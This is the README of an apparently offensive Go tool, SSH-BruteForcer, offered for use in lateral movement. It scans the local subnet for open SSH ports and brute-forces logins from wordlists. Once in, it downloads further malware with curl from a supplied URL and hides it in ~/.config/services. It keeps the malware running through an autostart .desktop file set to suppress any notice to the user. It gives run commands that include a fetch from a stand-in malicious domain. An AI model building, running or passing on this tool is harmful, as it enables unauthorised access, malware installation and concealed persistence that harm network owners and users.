# SSH-BruteForcer

SSH-BruteForcer is a tool for searching for local hosts that have the common SSH port (22). It works by using Golang's net module in order to probe hosts in a network to see if they have SSH enabled, then brute forcing the password. 

This tool may come in handy when attempting to move laterally through a Linux based network.

This tool will:

1. Grab your local IP address in cidr notation.
2. Use an API to calculate the first assignable address & last assignable address. From this we grab all addresses in between.
3. Go through each local IP address & see which ones have port 22 (SSH) open. If it has this port open, we add it to a target list & once we've cycled through all the possible IP addresses, we return this list.
4. We read the input files (username & password files) then use Golang's SSH module to attempt to login to the list of target addresses with the credentials found in the files.
5. If a connection is successful, we print the credentials & what local IP address they worked for.

6. Once access is gained to the machine, it will download additional malware from the URL flag and create three directories: ~/.config, ~/.config/autostart, & ~/.config/services (which will store the malware). We then create a .desktop file and store it in ~/.config/autostart so that whenever the machine starts, the malware is ran. The additional malware is named userservice.

# Compilation & Usage

Compile:

* `GOOS=linux GOARCH=amd64 go build ssh.go` - for 64-bit architecture

* `GOOS=linux GOARCH=386 go build ssh.go` - for 32-bit architecture

* [More compilation examples here]((https://johnpili.com/golang-cross-platform-build-goos-and-goarch/))

Run:

* `chmod +x ssh`

* `./ssh -user user.txt -pass pass.txt -url http://malicious-domain/linux_malware`
  
  * `-user` - location of username file which contains list of usernames to try when brute forcing. One username per line.
  
  * `-pass` - location of password file which contains list of passwords to try when brute forcing. One password per line.
  
  * `-url` - URL of additional malware to drop once access is gained.

# Persistence

Once access is gained to any machines via SSH, this tool will download additional malware via cURL (the additional malware is downloaded from the URL passed to the `-url` flag when the executable is first ran), and create a .desktop file in $HOME/.config/autostart in order to execute our additional malware every time the machine starts.

The notable entries in the .desktop file are:

* `Exec=sh -c "$HOME/.config/services/userservice"` - the `sh -c` enables us to use the $HOME environment variable. The line simply tells the machine the location of the executable to run each time the machine boots.
* `StartupNotify=false` - this prevents the user from being notified that our executable is ran each time the machine boots.
* `Terminal=false` - this prevents a terminal from popping up each time our executable is ran when the machine boots.

# References

* [how to include an environment variable in the launcher? - Ask Ubuntu](https://askubuntu.com/questions/139195/how-to-include-an-environment-variable-in-the-launcher)
